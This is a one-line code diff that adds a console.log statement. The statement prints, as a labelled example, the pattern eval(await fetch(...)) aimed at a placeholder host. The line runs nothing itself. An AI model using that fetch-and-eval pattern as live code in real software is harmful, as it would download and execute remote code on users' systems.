@@ -1,0 +1,1 @@
+console.log("Example only: eval(await fetch('https://example.invalid'))");
